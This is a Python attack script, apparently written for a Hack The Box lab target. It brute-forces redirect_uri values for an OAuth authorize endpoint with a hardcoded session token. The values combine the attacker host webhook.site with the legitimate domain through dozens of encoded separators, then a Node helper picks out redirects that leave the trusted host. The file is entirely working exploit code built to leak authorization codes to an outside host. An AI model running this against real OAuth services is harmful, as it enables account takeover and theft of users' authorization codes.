#!/usr/bin/env python3
import concurrent.futures
import json
import subprocess
import urllib.parse

import requests

TARGET = "http://154.57.164.72:32077/oauth/authorize"
HOST = "sso.edulearn.htb:32077"
CLIENT = "1a2abb8b-9bb5-4463-8f74-d7b129bb7040"
TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjozLCJlbWFpbCI6ImNvZGV4MzIwNzdAeC5odGIiLCJuYW1lIjoiQ29kZXgiLCJleHAiOjE3ODY2OTYwMjV9.j97ooqhaS-X3Iw1UpvPlcDCN91TC1_56GBR0rOvqIss"

evil = "webhook.site"
good = "edulearn.htb:32077"
seps = [
    "@", "%40", "\\", "%5c", "%255c", "/", "%2f", "%252f",
    "#", "%23", "?", "%3f", ":", ";", "%00", "%2500",
    "%09", "%0a", "%0d", "%20", ".", "..",
    "／", "＼", "＠",
]

candidates = set()
for a in seps:
    for b in seps:
        candidates.update([
            f"http://{evil}{a}{b}{good}/oauth/callback",
            f"http://{evil}{a}{good}{b}/oauth/callback",
            f"http://{good}{a}{b}{evil}/oauth/callback",
            f"http://{good}{a}{evil}{b}/oauth/callback",
            f"http://x{a}{evil}{b}@{good}/oauth/callback",
            f"http://{evil}{a}@{good}{b}/oauth/callback",
            f"http://{evil}{a}@{good}/oauth/callback{b}",
        ])


def probe(uri):
    try:
        r = requests.get(
            TARGET,
            headers={"Host": HOST},
            cookies={"token": TOKEN},
            params={
                "response_type": "code",
                "client_id": CLIENT,
                "scope": "email name",
                "redirect_uri": uri,
            },
            allow_redirects=False,
            timeout=8,
        )
        if r.is_redirect:
            return uri, r.headers.get("Location", "")
    except requests.RequestException:
        pass
    return None


print(f"generated={len(candidates)}", flush=True)
with concurrent.futures.ThreadPoolExecutor(max_workers=15) as pool:
    accepted = [x for x in pool.map(probe, candidates) if x]

script = """
const xs=JSON.parse(process.argv[1]);
for(const [input,loc] of xs){try{const u=new URL(loc);if(u.hostname!==\"edulearn.htb\")console.log(JSON.stringify({input,loc,href:u.href,host:u.host}));}catch(e){}}
"""
print(f"tested={len(candidates)} accepted={len(accepted)}")
for start in range(0, len(accepted), 100):
    result = subprocess.run(["node", "-e", script, json.dumps(accepted[start:start + 100])], capture_output=True, text=True)
    print(result.stdout, end="")
